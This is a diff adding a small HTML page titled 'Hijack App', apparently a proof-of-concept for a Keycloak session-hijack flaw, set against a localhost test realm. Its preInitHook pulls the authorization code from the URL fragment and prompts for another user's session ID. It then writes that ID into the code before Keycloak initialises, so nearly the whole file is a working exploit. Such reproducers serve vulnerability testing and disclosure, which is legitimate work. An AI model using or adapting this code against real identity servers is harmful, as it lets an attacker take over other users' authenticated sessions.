@@ -1,0 +1,55 @@
+<html lang="en">
+<head>
+    <title>Welcome to Hijack App</title>
+    <script src="keycloak.js"></script>
+    <script>
+        const keycloak = new Keycloak({
+            url: 'http://localhost:8080',
+            realm: 'test',
+            clientId: 'client1',
+        });
+
+        function preInitHook() {
+            const params = new URLSearchParams(window.location.hash.substring(1));
+            console.log(params);
+            if (params.has('code') && !params.has('sessionIdAdjusted')) {
+                const parsedCode = params.get('code').split('.');
+                const userSessionId = prompt(`Current User Session ID is:\n${parsedCode[1]}\nUser Session ID to hijack (leave empty to do not override):`);
+                if (userSessionId) {
+                    parsedCode[1] = userSessionId;
+                    params.set('code', parsedCode.join('.'));
+                    params.set('sessionIdAdjusted', 'true');
+                    window.location.hash = `#${params.toString()}`;
+                }
+            }
+        }
+
+        function initKeycloak() {
+            preInitHook();
+
+            keycloak.init({
+                checkLoginIframe: false,
+                onLoad: 'login-required',
+            }).then(function (authenticated) {
+                document.getElementById('result').textContent = authenticated ? 'authenticated' : 'not authenticated';
+                if (authenticated) {
+                    document.getElementById('user').textContent = keycloak.idTokenParsed.preferred_username || '';
+                }
+            }).catch(function (e) {
+                console.error(e);
+                document.getElementById('result').textContent = 'failed to initialize';
+            });
+        }
+
+        function logout() {
+            keycloak.logout();
+        }
+    </script>
+</head>
+<body onload="initKeycloak()">
+<div id="result"></div>
+<div id="user"></div>
+<button onclick="logout()">Logout</button>
+</body>
+</html>
+
